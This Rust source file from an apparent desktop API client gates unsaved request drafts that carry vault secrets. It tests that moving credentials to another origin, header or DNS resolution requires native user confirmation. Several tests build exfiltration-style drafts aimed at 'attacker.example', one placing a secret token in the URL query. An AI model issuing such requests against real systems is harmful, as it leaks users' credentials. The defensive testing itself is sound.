//! Vault-backed authority of a request draft from the webview.
//!
//! A send, an interactive session and an OAuth sign-in may carry an unsaved
//! draft of the request (`SendInput::spec`). Its context resolves the
//! workspace's vault secrets, secret variables and inherited auth in the
//! backend, as a saved request's does; nothing secret is returned to the
//! webview. What the webview chooses is where they go. So a draft that
//! carries any of them ([`carries_vault_authority`]) is used only where its
//! saved request would use them: the same destination origin, with the same
//! effective auth and the same connection settings (proxy, TLS profile and
//! verification, DNS overrides, redirects and the rest, see [`Binding`]),
//! worked out in the backend after variables are resolved. A draft without
//! a saved request, or one that differs there, is used only once the user
//! confirms it in a native dialog naming the workspace and the destination
//! (see `crate::presence`). Each confirmation authorizes one send, session
//! or sign-in. A draft that carries no vault-backed authority is not asked
//! about, so local and private APIs keep working.

use crate::commands::{CANCELED, R, e};
use crate::presence::{Presence, Prompt, confirm};
use crate::state::DesktopState;
use anvil_app::App;
use anvil_app::exec::SendOptions;
use anvil_domain::Id;
use anvil_domain::auth::AuthConfig;
use anvil_domain::request::RequestSpec;
use anvil_engine::ExecutionOutput;
use anvil_engine::context::ExecutionContext;
use anvil_engine::vars::Resolver;
use anvil_transport::recorder::EventCtx;
use serde_json::Value;
use std::sync::Arc;
use tokio_util::sync::CancellationToken;

/// Whether `ctx` carries anything from the workspace's vault or its secret
/// settings: auth in effect (the request's own or inherited), a secret
/// variable in any scope it resolves, a vault reference in the spec or in
/// the TLS, proxy or integration profile its settings select, or a client
/// identity in a selected TLS profile.
pub(crate) fn carries_vault_authority(ctx: &ExecutionContext) -> bool {
    if !matches!(ctx.effective_auth().1, AuthConfig::None) {
        return true;
    }
    if ctx.var_layers.iter().any(|l| l.vars.iter().any(|v| v.secret)) {
        return true;
    }
    let settings = anvil_engine::settings::resolve(&ctx.settings_layers);
    let proxy = settings.proxy_profile_id.and_then(|id| ctx.proxy_profiles.iter().find(|p| p.id == id));
    let selected = [settings.tls_profile_id, proxy.and_then(|p| p.tls_profile_id)];
    let tls: Vec<_> = ctx.tls_profiles.iter().filter(|p| selected.contains(&Some(p.id))).collect();
    if tls.iter().any(|p| p.client_identity.is_some()) {
        return true;
    }
    let integration = settings.integration_profile_id.and_then(|id| ctx.integrations.iter().find(|i| i.id == id));
    let parts = [
        serde_json::to_value(&ctx.spec),
        serde_json::to_value(&tls),
        serde_json::to_value(proxy),
        serde_json::to_value(integration),
    ];
    // A part that does not serialize is taken to carry one.
    parts.iter().any(|p| match p {
        Ok(v) => names_a_secret(v),
        Err(_) => true,
    })
}

/// Whether `v` holds a vault reference (`SensitiveValue::Secret`).
fn names_a_secret(v: &Value) -> bool {
    match v {
        Value::Object(o) => {
            let is_ref = o.get("kind").and_then(Value::as_str) == Some("secret") && o.contains_key("secret");
            is_ref || o.values().any(names_a_secret)
        }
        Value::Array(a) => a.iter().any(names_a_secret),
        _ => false,
    }
}

/// Where, and how, a context uses what it carries: the destination origin
/// after variables are resolved, the auth in effect and the effective
/// connection settings.
#[derive(Debug, PartialEq)]
pub(crate) struct Binding {
    /// `scheme://host:port`; `None` if the backend cannot work it out
    /// before sending (an unparsable URL, or one with a per-send value in
    /// its origin).
    origin: Option<String>,
    auth: Value,
    settings: Value,
}

impl Binding {
    pub(crate) fn of(ctx: &ExecutionContext) -> Binding {
        let resolver = Resolver::new(ctx.var_layers.clone(), ctx.seed);
        let origin = resolver.resolve(&ctx.spec.url, "url").ok().and_then(|url| origin_of(&url));
        Binding {
            origin,
            auth: serde_json::to_value(ctx.effective_auth()).unwrap_or(Value::Null),
            settings: serde_json::to_value(anvil_engine::settings::resolve(&ctx.settings_layers)).unwrap_or(Value::Null),
        }
    }

    /// Whether `self` uses what it carries as `saved` does. A destination
    /// that cannot be worked out, or anything that does not serialize,
    /// matches nothing.
    fn matches(&self, saved: &Binding) -> bool {
        self.origin.is_some() && !self.auth.is_null() && !self.settings.is_null() && self == saved
    }
}

/// `scheme://host:port` of `url`, with the scheme's default port if it has
/// none. Any value with a per-send part (`{{$…}}`) resolves differently
/// each time, so its origin is not known before sending.
fn origin_of(url: &str) -> Option<String> {
    let parsed = url::Url::parse(url.trim()).ok()?;
    let host = parsed.host_str()?;
    let port = parsed.port_or_known_default().map(|p| format!(":{p}")).unwrap_or_default();
    Some(format!("{}://{host}{port}", parsed.scheme()))
}

fn prompt(workspace: &str, origin: Option<&str>, saved: bool) -> Prompt {
    let destination = origin.unwrap_or("an address Anvil cannot work out before sending");
    let message = if saved {
        format!(
            "This request's unsaved changes would use credentials or secret values from the workspace “{workspace}” with {destination}, or with other auth or connection settings than the saved request uses.\n\nOnly continue if you made these changes yourself."
        )
    } else {
        format!(
            "This unsaved request would use credentials or secret values from the workspace “{workspace}” with {destination}.\n\nOnly continue if you made this request yourself."
        )
    };
    Prompt { title: "Use workspace credentials?", message, ok: "Continue" }
}

/// Refuse the draft context `draft` unless what it carries from the vault
/// goes where its saved request `request_id` would send it, or the user
/// confirms it natively. `opts` are the options it was built with; the
/// saved request is built with the same ones to compare.
pub(crate) async fn authorize(
    st: &DesktopState,
    presence: &impl Presence,
    app: &Arc<App>,
    request_id: Option<Id>,
    ws: Id,
    draft: &ExecutionContext,
    opts: &SendOptions,
) -> R<()> {
    if !carries_vault_authority(draft) {
        return Ok(());
    }
    let binding = Binding::of(draft);
    let (owner, opts) = (app.clone(), opts.clone());
    // Built on a blocking thread, as the draft's context was.
    let differs = anvil_app::off_runtime(move || {
        let saved = request_id.map(|rid| owner.build_context(Some(rid), &ws, None, &opts));
        if matches!(&saved, Some(Ok(ctx)) if binding.matches(&Binding::of(ctx))) {
            return Ok(None);
        }
        Ok(Some((owner.workspace(&ws)?.name, binding.origin)))
    })
    .await
    .map_err(e)?;
    let Some((workspace, origin)) = differs else {
        return Ok(());
    };
    confirm(st, presence, prompt(&workspace, origin.as_deref(), request_id.is_some())).await?;
    Ok(())
}

/// Send the draft `draft` of `request_id` (or an unsaved request) once
/// [`authorize`] allows it, and record it as [`App::send`] does.
#[allow(clippy::too_many_arguments)]
pub(crate) async fn send_draft(
    st: &DesktopState,
    presence: &impl Presence,
    app: &Arc<App>,
    request_id: Option<Id>,
    ws: Id,
    draft: RequestSpec,
    opts: SendOptions,
    events: EventCtx,
    cancel: &CancellationToken,
) -> R<ExecutionOutput> {
    let record_history = opts.record_history;
    let ctx = app.build_context_off_runtime(request_id, ws, Some(draft), opts.clone(), cancel).await.map_err(e)?;
    authorize(st, presence, app, request_id, ws, &ctx, &opts).await?;
    // Canceled (or locked) while the dialog was open: nothing is sent.
    if cancel.is_cancelled() {
        return Err(CANCELED.into());
    }
    let out = app.engine.execute(&ctx, events, cancel.clone()).await;
    if !record_history {
        return Ok(out);
    }
    let (out, recorded) = app.record_off_runtime(out).await;
    recorded.map_err(e)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::presence::NOT_CONFIRMED;
    use crate::presence::testing::Answer;
    use crate::state::tests::{TempRoot, create};
    use anvil_domain::secret::{SecretRef, SensitiveValue};
    use anvil_domain::settings::DnsOverride;
    use anvil_domain::workspace::Variable;

    struct Fixture {
        _root: TempRoot,
        st: DesktopState,
        app: Arc<App>,
        ws: Id,
        secret: SecretRef,
    }

    fn fixture() -> Fixture {
        let root = TempRoot::new();
        let st = DesktopState::new(root.0.clone());
        let (app, _) = create(&st, "P");
        st.set_app_since(app, st.epoch()).unwrap();
        let app = st.app().unwrap();
        let ws = app.create_workspace("Payments").unwrap().meta.id;
        let secret = app.set_secret(&ws, "api token", "vault-canary-token").unwrap();
        Fixture { _root: root, st, app, ws, secret }
    }

    fn bearer(secret: &SecretRef) -> AuthConfig {
        AuthConfig::Bearer { token: SensitiveValue::Secret { secret: secret.clone() }, prefix: "Bearer".into() }
    }

    impl Fixture {
        /// A saved request to `url` with `auth`, and its id.
        fn saved(&self, url: &str, auth: AuthConfig) -> (Id, RequestSpec) {
            let mut spec = RequestSpec::http("GET", url);
            spec.auth = auth;
            let r = self.app.create_request(&self.ws, None, "saved", spec.clone()).unwrap();
            (r.meta.id, spec)
        }

        /// Whether `draft` of `request_id` goes ahead under `presence`.
        async fn authorized(&self, presence: &impl Presence, request_id: Option<Id>, draft: RequestSpec) -> R<()> {
            let opts = SendOptions::default();
            let ctx = self.app.build_context(request_id, &self.ws, Some(draft), &opts).unwrap();
            authorize(&self.st, presence, &self.app, request_id, self.ws, &ctx, &opts).await
        }
    }

    #[tokio::test]
    async fn an_unsaved_request_with_vault_credentials_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let mut draft = RequestSpec::http("GET", "https://attacker.example/collect");
        draft.auth = bearer(&f.secret);
        let no = Answer::no();
        assert_eq!(f.authorized(&no, None, draft.clone()).await, Err(NOT_CONFIRMED.to_string()));
        assert_eq!(no.times(), 1);
        let asked = no.asked.lock()[0].clone();
        assert!(asked.contains("“Payments”") && asked.contains("https://attacker.example:443"), "{asked}");
        assert!(!asked.contains("vault-canary-token"));
        let yes = Answer::yes();
        assert_eq!(f.authorized(&yes, None, draft).await, Ok(()));
        assert_eq!(yes.times(), 1);
    }

    #[tokio::test]
    async fn a_draft_moving_saved_credentials_to_another_origin_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let (rid, saved) = f.saved("https://api.payments.example/v1/charges", bearer(&f.secret));
        let moved = [
            "https://attacker.example/v1/charges",
            // Cleartext, or another port, is another origin.
            "http://api.payments.example/v1/charges",
            "https://api.payments.example:8443/v1/charges",
        ];
        for url in moved {
            let draft = RequestSpec { url: url.into(), ..saved.clone() };
            let no = Answer::no();
            assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()), "{url}");
            assert_eq!(no.times(), 1, "{url}");
        }
    }

    #[tokio::test]
    async fn a_draft_that_sends_saved_credentials_where_the_saved_request_does_is_not_asked() {
        let f = fixture();
        let (rid, saved) = f.saved("https://api.payments.example/v1/charges", bearer(&f.secret));
        let unasked = Answer::no();
        // As saved, and with another path, query, method and headers.
        assert_eq!(f.authorized(&unasked, Some(rid), saved.clone()).await, Ok(()));
        let mut edited = RequestSpec { url: "https://API.payments.example:443/v2/refunds?limit=5".into(), ..saved.clone() };
        edited.method = "POST".into();
        assert_eq!(f.authorized(&unasked, Some(rid), edited).await, Ok(()));
        assert_eq!(unasked.times(), 0);
    }

    #[tokio::test]
    async fn a_draft_inheriting_workspace_auth_is_bound_like_its_own() {
        let f = fixture();
        let mut w = f.app.workspace(&f.ws).unwrap();
        w.auth = bearer(&f.secret);
        f.app.save_workspace(w).unwrap();
        let (rid, saved) = f.saved("https://api.payments.example/v1", AuthConfig::Inherit);
        let unasked = Answer::no();
        assert_eq!(f.authorized(&unasked, Some(rid), saved.clone()).await, Ok(()));
        assert_eq!(unasked.times(), 0);
        let no = Answer::no();
        let moved = RequestSpec { url: "https://attacker.example/v1".into(), ..saved };
        assert_eq!(f.authorized(&no, Some(rid), moved).await, Err(NOT_CONFIRMED.to_string()));
    }

    #[tokio::test]
    async fn a_draft_using_a_secret_variable_elsewhere_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let mut w = f.app.workspace(&f.ws).unwrap();
        let value = SensitiveValue::Secret { secret: f.secret.clone() };
        w.variables.push(Variable { name: "token".into(), value, secret: true, enabled: true, description: String::new() });
        f.app.save_workspace(w).unwrap();
        let (rid, _) = f.saved("https://api.payments.example/v1", AuthConfig::None);
        let mut draft = RequestSpec::http("GET", "https://attacker.example/?t={{token}}");
        draft.auth = AuthConfig::None;
        let no = Answer::no();
        assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()));
        assert!(!no.asked.lock()[0].contains("vault-canary-token"));
    }

    #[tokio::test]
    async fn a_draft_changing_how_saved_credentials_are_carried_is_refused_unless_confirmed_natively() {
        let f = fixture();
        let (rid, saved) = f.saved("https://api.payments.example/v1", bearer(&f.secret));
        // The same URL, resolved to another address.
        let mut dns = saved.clone();
        dns.settings.dns_overrides.push(DnsOverride { host: "api.payments.example".into(), addresses: vec!["127.0.0.1".into()] });
        // The same URL and token, in another header.
        let mut header = saved.clone();
        let value = SensitiveValue::Secret { secret: f.secret.clone() };
        header.auth = AuthConfig::ApiKey { name: "X-Token".into(), value, location: Default::default() };
        for draft in [dns, header] {
            let no = Answer::no();
            assert_eq!(f.authorized(&no, Some(rid), draft).await, Err(NOT_CONFIRMED.to_string()));
            assert_eq!(no.times(), 1);
        }
    }

    #[tokio::test]
    async fn a_draft_without_vault_authority_is_not_asked_even_for_a_local_service() {
        let f = fixture();
        let unasked = Answer::no();
        let mut local = RequestSpec::http("GET", "http://127.0.0.1:8080/health");
        local.auth = AuthConfig::None;
        assert_eq!(f.authorized(&unasked, None, local.clone()).await, Ok(()));
        let (rid, _) = f.saved("https://api.payments.example/v1", AuthConfig::None);
        assert_eq!(f.authorized(&unasked, Some(rid), local).await, Ok(()));
        assert_eq!(unasked.times(), 0);
    }

    #[tokio::test]
    async fn each_draft_send_is_asked_again() {
        let f = fixture();
        let mut draft = RequestSpec::http("GET", "https://elsewhere.example/");
        draft.auth = bearer(&f.secret);
        let yes = Answer::yes();
        f.authorized(&yes, None, draft.clone()).await.unwrap();
        f.authorized(&yes, None, draft.clone()).await.unwrap();
        assert_eq!(yes.times(), 2, "one answer authorizes one use");
        let no = Answer::no();
        assert_eq!(f.authorized(&no, None, draft).await, Err(NOT_CONFIRMED.to_string()));
    }

    #[tokio::test]
    async fn a_lock_while_the_dialog_is_open_refuses_the_draft() {
        let f = fixture();
        let mut draft = RequestSpec::http("GET", "https://elsewhere.example/");
        draft.auth = bearer(&f.secret);
        let opts = SendOptions::default();
        let ctx = f.app.build_context(None, &f.ws, Some(draft), &opts).unwrap();
        let yes = Answer::with(true, || f.st.lock());
        assert_eq!(authorize(&f.st, &yes, &f.app, None, f.ws, &ctx, &opts).await, Err("LOCKED".to_string()));
    }

    #[test]
    fn an_origin_is_only_known_when_the_url_names_one() {
        assert_eq!(origin_of("https://Example.com/a?b"), Some("https://example.com:443".into()));
        assert_eq!(origin_of("http://example.com:8080"), Some("http://example.com:8080".into()));
        assert_eq!(origin_of("wss://example.com/socket"), Some("wss://example.com:443".into()));
        assert_eq!(origin_of("tcp://10.0.0.1:7000"), Some("tcp://10.0.0.1:7000".into()));
        assert_eq!(origin_of("example.com/a"), None);
        assert_eq!(origin_of("not a url"), None);
        let unknown = Binding { origin: None, auth: Value::Bool(true), settings: Value::Bool(true) };
        assert!(!unknown.matches(&Binding { origin: None, auth: Value::Bool(true), settings: Value::Bool(true) }));
    }
}
